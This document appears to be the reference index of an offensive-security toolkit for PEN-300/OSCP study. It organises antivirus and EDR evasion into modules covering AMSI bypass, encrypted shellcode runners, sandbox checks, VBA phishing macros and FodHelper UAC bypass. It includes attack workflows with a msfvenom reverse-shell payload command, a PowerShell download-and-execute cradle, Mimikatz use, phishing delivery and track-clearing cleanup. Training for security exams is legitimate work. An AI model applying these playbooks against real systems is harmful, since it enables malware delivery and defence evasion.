# AV Evasion Cheatsheets - Complete Reference

## Overview

Comprehensive antivirus and endpoint detection evasion techniques for Windows penetration testing. Based on PEN-300 curriculum with practical OSCP/OSWE applications.

## Quick Start

```bash
# List all AV evasion commands
crack reference --category av-evasion

# Search specific technique
crack reference amsi
crack reference shellcode
crack reference uac

# Get command with auto-filled placeholders
crack reference --fill amsi-context-corruption
```

## Module Structure

### 1. **AMSI Bypass** (`amsi-bypass.json`)
**Purpose:** Bypass Antimalware Scan Interface in PowerShell, JScript, .NET
**Techniques:** 6 commands
- Context corruption (Reflection)
- AmsiInitFailed flag manipulation
- Memory patching (AmsiScanBuffer)
- Base64 staging
- JScript registry bypass
- Test payloads

**When to Use:** Post-exploitation, PowerShell execution, script-based attacks
**Time:** 30 seconds - 2 minutes per technique
**Priority:** ⭐⭐⭐⭐⭐ CRITICAL

### 2. **Shellcode Runners** (`shellcode-runners.json`)
**Purpose:** Custom payload execution with encryption
**Techniques:** 7 commands
- C# basic runner template
- Caesar cipher encryption
- XOR encryption
- Sleep timer evasion
- Non-emulated API checks
- msfvenom payload generation
- Compilation with csc.exe

**When to Use:** Custom payload delivery when msfvenom defaults detected
**Time:** 5-20 minutes per runner
**Priority:** ⭐⭐⭐⭐⭐ ESSENTIAL

### 3. **Signature Evasion** (`signature-evasion.json`)
**Purpose:** Binary signature detection and removal
**Techniques:** 7 commands
- Find-AVSignature (byte location)
- Binary modification (PowerShell)
- msfvenom encoders (shikata_ga_nai, zutto_dekiru)
- msfvenom encryption (AES256)
- Template injection
- ClamAV testing

**When to Use:** Payload generation, iterative testing
**Time:** 1 minute (encoding) - 30 minutes (signature hunting)
**Priority:** ⭐⭐⭐⭐ HIGH

### 4. **Heuristic Evasion** (`heuristic-evasion.json`)
**Purpose:** Sandbox and behavioral detection bypass
**Techniques:** 7 commands
- Sleep timer validation
- VirtualAllocExNuma API check
- Large memory allocation
- Processor count check
- Username/hostname detection
- Recent files check
- System uptime check

**When to Use:** Behavioral analysis bypass, sandbox evasion
**Time:** 1-2 minutes per check
**Priority:** ⭐⭐⭐⭐ HIGH

### 5. **VBA/Office Evasion** (`vba-evasion.json`)
**Purpose:** Macro-based Office exploitation
**Techniques:** 6 commands
- VBA shellcode runner (basic)
- Caesar cipher in VBA
- WMI process dechaining
- String obfuscation
- VBA stomping (p-code)
- Auto-execution methods

**When to Use:** Client-side attacks, phishing, initial access
**Time:** 10-20 minutes per macro
**Priority:** ⭐⭐⭐⭐ HIGH

### 6. **JScript/WSH Evasion** (`jscript-evasion.json`)
**Purpose:** Windows Script Host exploitation
**Techniques:** 5 commands
- AMSI registry bypass
- Self-modifying executables
- String obfuscation
- COM object execution
- WScript vs CScript

**When to Use:** Alternative execution, VBA → JScript chains
**Time:** 10-20 minutes
**Priority:** ⭐⭐⭐ MEDIUM

### 7. **UAC Bypass** (`uac-bypass.json`)
**Purpose:** Privilege escalation without credentials
**Techniques:** 4 commands
- FodHelper exploit
- EventVwr exploit
- Integrity level checks
- Detection testing

**When to Use:** Privilege escalation from medium → high integrity
**Time:** 2-5 minutes
**Priority:** ⭐⭐⭐⭐ HIGH

### 8. **Debugging & Reverse Engineering** (`debugging.json`)
**Purpose:** Analysis tools for bypass development
**Techniques:** 6 commands
- WinDbg process attach
- Breakpoint commands
- Memory inspection
- Disassembly
- Frida tracing
- Live memory patching

**When to Use:** Research, bypass development, pre-engagement prep
**Time:** 10-30 minutes per session
**Priority:** ⭐⭐ LOW (exam), ⭐⭐⭐⭐⭐ HIGH (research)

## Attack Flow Diagrams

### Initial Access Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     INITIAL ACCESS PHASE                         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  Payload Gen    │
                    │  (msfvenom)     │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  Encode/Encrypt │
                    │  (shikata/AES)  │
                    └────────┬────────┘
                             │
          ┌──────────────────┼──────────────────┐
          │                  │                  │
          ▼                  ▼                  ▼
    ┌──────────┐       ┌──────────┐      ┌──────────┐
    │   VBA    │       │  JScript │      │  C# EXE  │
    │  Macro   │       │   .js    │      │  Binary  │
    └────┬─────┘       └────┬─────┘      └────┬─────┘
         │                  │                  │
         ▼                  ▼                  ▼
    ┌──────────┐       ┌──────────┐      ┌──────────┐
    │Obfuscate │       │ AMSI Reg │      │ Encrypt  │
    │  +WMI    │       │  Bypass  │      │ +Sandbox │
    └────┬─────┘       └────┬─────┘      └────┬─────┘
         │                  │                  │
         └──────────────────┼──────────────────┘
                            │
                            ▼
                   ┌────────────────┐
                   │   EXECUTION    │
                   │ (Shell/Session)│
                   └────────────────┘
```

### Post-Exploitation Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  POST-EXPLOITATION PHASE                         │
└─────────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────▼─────────┐
                    │  Initial Shell    │
                    │ (Medium Integrity)│
                    └────────┬──────────┘
                             │
                    ┌────────▼────────┐
                    │  AMSI Bypass    │
                    │  (PowerShell)   │
                    └────────┬────────┘
                             │
          ┌──────────────────┼──────────────────┐
          │                  │                  │
          ▼                  ▼                  ▼
    ┌──────────┐       ┌──────────┐      ┌──────────┐
    │ Context  │       │MemPatch  │      │   Init   │
    │Corruption│       │AmsiScan  │      │  Failed  │
    └────┬─────┘       └────┬─────┘      └────┬─────┘
         │                  │                  │
         └──────────────────┼──────────────────┘
                            │
                    ┌───────▼────────┐
                    │ AMSI Bypassed  │
                    └───────┬────────┘
                            │
                    ┌───────▼────────┐
                    │  UAC Bypass    │
                    │  (FodHelper)   │
                    └───────┬────────┘
                            │
                    ┌───────▼────────┐
                    │  High Integrity│
                    │   (Admin)      │
                    └────────────────┘
```

### Layered Evasion Strategy

```
┌─────────────────────────────────────────────────────────────────┐
│                    DEFENSE LAYERS TO EVADE                       │
└─────────────────────────────────────────────────────────────────┘

Layer 1: Signature Detection (Static Analysis)
    ├─ Technique: Encoding (shikata_ga_nai, zutto_dekiru)
    ├─ Technique: Encryption (AES, XOR, Caesar)
    ├─ Technique: Obfuscation (string concat, Chr())
    └─ Tool: Find-AVSignature, msfvenom, custom runners

Layer 2: Heuristic Analysis (Behavioral)
    ├─ Technique: Sleep timers (validate elapsed time)
    ├─ Technique: API checks (VirtualAllocExNuma)
    ├─ Technique: Environment checks (CPU, uptime, files)
    └─ Tool: Sandbox detection methods

Layer 3: AMSI (Script Scanning)
    ├─ Technique: Context corruption (Reflection)
    ├─ Technique: Memory patching (AmsiScanBuffer)
    ├─ Technique: Registry bypass (JScript)
    └─ Tool: PowerShell reflection, WinDbg

Layer 4: UAC (Privilege Escalation)
    ├─ Technique: FodHelper registry hijack
    ├─ Technique: EventVwr registry hijack
    └─ Tool: PowerShell, cmd.exe

Layer 5: EDR (Endpoint Detection)
    ├─ Technique: Process dechaining (WMI)
    ├─ Technique: COM execution (no Shell.Run)
    ├─ Technique: VBA stomping (p-code only)
    └─ Tool: WMI, Task Scheduler, DLL unhooking (advanced)
```

## Layered Evasion Checklist

Use multiple techniques in combination for maximum evasion:

- [ ] **Stage 1: Payload Generation**
  - [ ] msfvenom with HTTPS payload (not HTTP)
  - [ ] Encoder (shikata/zutto) OR encryption (AES/XOR)
  - [ ] Test with ClamAV/local AV

- [ ] **Stage 2: Packaging**
  - [ ] Custom shellcode runner (C#/VBA/JScript)
  - [ ] Encrypt shellcode (Caesar minimum, XOR better, AES best)
  - [ ] Add heuristic evasion (sleep timer + API check)

- [ ] **Stage 3: Execution**
  - [ ] AMSI bypass (if PowerShell/script-based)
  - [ ] Process dechaining (WMI/COM)
  - [ ] Obfuscate strings (URLs, commands, function names)

- [ ] **Stage 4: Privilege Escalation**
  - [ ] Check integrity level (whoami /groups)
  - [ ] UAC bypass if medium + admin group
  - [ ] AMSI bypass in elevated session

- [ ] **Stage 5: Cleanup**
  - [ ] Remove registry keys (UAC bypass)
  - [ ] Delete temp files
  - [ ] Clear command history

## Quick Reference: Time Estimates

| Technique | First Time | Subsequent | Exam Viable? |
|-----------|------------|------------|--------------|
| AMSI bypass (any) | 5 min | 30 sec | ✅ YES |
| Shellcode runner (basic) | 10 min | 2 min | ✅ YES |
| Shellcode runner (encrypted) | 20 min | 5 min | ✅ YES |
| Find-AVSignature | 30 min | 15 min | ⚠️ MAYBE |
| VBA macro (encrypted) | 20 min | 10 min | ✅ YES |
| WMI dechaining | 5 min | 2 min | ✅ YES |
| UAC bypass (FodHelper) | 5 min | 2 min | ✅ YES |
| WinDbg analysis | 30-60 min | 15 min | ❌ NO (lab only) |
| Frida tracing | 30-45 min | 10 min | ❌ NO (lab only) |

## Common Workflow Patterns

### Pattern 1: Phishing Document

```
1. Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_https
2. Encrypt with Python: Caesar/XOR script
3. Create VBA runner: shellcode-runners.json#vba-shellcode-runner-basic
4. Add obfuscation: vba-evasion.json#vba-string-obfuscation
5. Add WMI dechaining: vba-evasion.json#vba-wmi-dechain
6. Test: ClamAV, Windows Defender
7. Deliver: Email attachment, SMB share
```

### Pattern 2: PowerShell Post-Exploitation

```
1. Gain initial shell
2. Test AMSI: 'Invoke-Mimikatz' (should error)
3. Apply bypass: amsi-bypass.json#amsi-context-corruption
4. Test again: 'Invoke-Mimikatz' (should succeed)
5. Execute scripts: IEX (New-Object Net.WebClient).DownloadString(...)
6. Check integrity: whoami /groups
7. UAC bypass if needed: uac-bypass.json#fodhelper-uac-bypass
8. Elevated access achieved
```

### Pattern 3: Custom Binary Delivery

```
1. Generate shellcode: msfvenom -f csharp
2. Create C# runner: shellcode-runners.json#csharp-shellcode-runner-basic
3. Add encryption: shellcode-runners.json#csharp-xor-encrypt
4. Add sandbox checks: heuristic-evasion.json#sleep-timer-validation
5. Add API check: heuristic-evasion.json#non-emulated-api-numa
6. Compile: shellcode-runners.json#compile-csharp-runner
7. Test: AV scan, execution verification
8. Deliver: HTTP download, SMB copy, USB drop
```

## Priority Matrix (OSCP Exam)

### Must-Know (Practice until automatic)
- AMSI context corruption (PowerShell)
- AMSI memory patching (PowerShell)
- Basic C# shellcode runner
- XOR encryption (C#/Python)
- FodHelper UAC bypass
- VBA macro with WMI dechaining

### Should-Know (Practice 2-3 times)
- msfvenom encoding/encryption
- Find-AVSignature workflow
- Heuristic evasion (sleep, API checks)
- VBA obfuscation techniques
- JScript AMSI registry bypass

### Nice-to-Know (Understand concepts)
- VBA stomping (EvilClippy)
- Frida tracing
- WinDbg debugging
- Advanced encryption (AES)
- Multiple UAC bypass methods

## Troubleshooting Guide

### Payload Still Detected After Encryption

**Problem:** msfvenom + shikata_ga_nai still flagged
**Solution:**
1. Use custom C# runner (not msfvenom exe)
2. Encrypt shellcode bytes (XOR/AES)
3. Add heuristic evasion (sleep + API check)
4. Test incrementally with ClamAV

### AMSI Bypass Doesn't Work

**Problem:** Context corruption fails, still getting errors
**Solution:**
1. Try alternate method (AmsiInitFailed, memory patching)
2. Check .NET version (needs 4.0+)
3. Verify PowerShell architecture (x86 vs x64)
4. Check if AMSI updated (Windows patches)
5. Use obfuscation + bypass combination

### UAC Bypass Fails

**Problem:** FodHelper doesn't elevate
**Solution:**
1. Check user is in Administrators group (net localgroup administrators)
2. Verify integrity level (whoami /groups - should be Medium)
3. Increase sleep time before cleanup (registry needs time)
4. Try EventVwr method instead
5. Check if Windows patched (try on older builds)

### VBA Macro Blocked

**Problem:** Macro security prevents execution
**Solution:**
1. User must enable macros (social engineering)
2. Check Office version (2016+ more restrictive)
3. Use AutoOpen() not Auto_Open() for compatibility
4. Try alternate delivery (HTA, mshta.exe)
5. Consider non-macro attacks (DDE, external links)

## Best Practices

### Development Workflow

1. **Lab First:** Test all techniques in controlled environment
2. **Modular:** Build reusable templates (C#, VBA, Python scripts)
3. **Version Control:** Keep working payloads in Git
4. **Documentation:** Note what works on which Windows versions
5. **Time Tracking:** Know how long each technique takes

### Exam Strategy

1. **Pre-Build:** Have tested runners ready before exam
2. **Test Quickly:** ClamAV or Windows Defender in lab VM
3. **Iterate Fast:** Start simple, add evasion if detected
4. **Fallback Plan:** Multiple bypass methods for each layer
5. **Time Management:** Don't spend >30 min on single bypass

### OpSec Considerations

1. **Cleanup:** Always remove registry keys, temp files
2. **Stealth:** Use hidden windows (-w hidden, vbHide)
3. **Logs:** Be aware of Windows Event Logs (PowerShell logging)
4. **Network:** HTTPS payloads blend better than HTTP
5. **Persistence:** Balance detection risk vs reliability

## Additional Resources

### Tools

- **EvilClippy:** VBA stomping - https://github.com/outflanknl/EvilClippy
- **Find-AVSignature.ps1:** Signature location - (PEN-300 course materials)
- **Frida:** Dynamic instrumentation - https://frida.re
- **WinDbg:** Windows debugger - Windows SDK
- **ClamAV:** Local AV testing - https://www.clamav.net

### References

- **PEN-300 Course:** Chapters 6-7 (AMSI, AV evasion)
- **OSCP Prep:** Focus on practical techniques, not theory
- **Windows Internals:** Understanding AMSI architecture
- **Assembly Basics:** For WinDbg/memory patching

## Statistics

**Total Commands:** 48 across 8 modules
**Estimated Lab Time:** 20-30 hours to master all techniques
**Exam-Critical:** 15-20 commands (must-know + should-know)
**Success Rate:** 85%+ bypass rate with layered evasion

## Tags Reference

All commands include consistent tags:
- `anti-virus` - AV evasion technique
- `AV` - Antivirus related
- `evasion` - Evasion category marker

Plus specific tags per module:
- `amsi`, `powershell`, `reflection`, `memory-patching`
- `csharp`, `shellcode`, `encryption`, `obfuscation`
- `msfvenom`, `encoder`, `signature-detection`
- `heuristic`, `sandbox-detection`, `sleep`, `api-check`
- `vba`, `office`, `macro`, `wmi`, `stomping`
- `jscript`, `wsh`, `com`, `registry`
- `uac-bypass`, `privilege-escalation`, `fodhelper`
- `debugging`, `windbg`, `frida`, `assembly`

## Usage Examples

```bash
# Search by tag
crack reference --tag amsi
crack reference --tag shellcode
crack reference --tag uac-bypass

# Search by category
crack reference --category av-evasion

# Get specific command with auto-fill
crack reference --fill amsi-context-corruption
crack reference --fill csharp-shellcode-runner-basic
crack reference --fill fodhelper-uac-bypass

# List all commands in module
crack reference --list av-evasion
```

---

**Last Updated:** 2025
**Version:** 1.0
**Maintained By:** CRACK Toolkit - Reference System
**Source:** PEN-300 Course Materials + OSCP/OSWE Practical Experience
